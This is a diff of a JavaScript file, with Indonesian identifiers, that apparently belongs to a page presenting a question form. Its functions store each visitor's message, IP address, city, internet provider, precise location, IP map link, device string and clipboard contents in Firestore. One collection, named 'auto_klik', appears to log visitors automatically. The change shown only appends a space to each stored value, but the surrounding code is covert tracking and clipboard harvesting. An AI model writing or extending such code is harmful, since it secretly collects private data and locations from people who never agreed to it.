@@ -20,19 +20,19 @@ async function sendData() {
 
 async function saveDataBase(waktu, kota, ipAddress, providerInternet, providerOrg, lokasi, lokasiIP, device, clipboard) {
     db.collection("users").add({
-        pesan: $('#question').val(),
-        waktu: waktu,
+        pesan: $('#question').val() + " ",
+        waktu: waktu + " ",
 
-        kota: kota,
-        ipAddress: ipAddress,
-        providerInternet: providerInternet,
-        providerOrg: providerOrg,
+        kota: kota + " ",
+        ipAddress: ipAddress + " ",
+        providerInternet: providerInternet + " ",
+        providerOrg: providerOrg + " ",
 
-        lokasiTepat: lokasi,
-        lokasiIP: lokasiIP,
+        lokasiTepat: lokasi + " ",
+        lokasiIP: lokasiIP + " ",
 
-        device: device,
-        clipboard: clipboard,
+        device: device + " ",
+        clipboard: clipboard + " ",
     })
         .then(() => {
             console.log("Berhasil Kirim Data");
@@ -108,13 +108,13 @@ async function saveDataAuto() {
         var lokasiIPmaps = "https://maps.google.com/?q=" + e.loc;
 
         db.collection("auto_klik").add({
-            waktu: formattedTime,
-            kota: e.city,
-            ipAddress: e.ip,
-            providerInternet: e.hostname,
-            providerOrg: e.org,
-            lokasiIP: lokasiIPmaps,
-            device: window.navigator.userAgent,
+            waktu: formattedTime + " ",
+            kota: e.city + " ",
+            ipAddress: e.ip + " ",
+            providerInternet: e.hostname + " ",
+            providerOrg: e.org + " ",
+            lokasiIP: lokasiIPmaps + " ",
+            device: window.navigator.userAgent + " ",
         })
             .then(() => {
                 console.log("Berhasil Kirim Data");
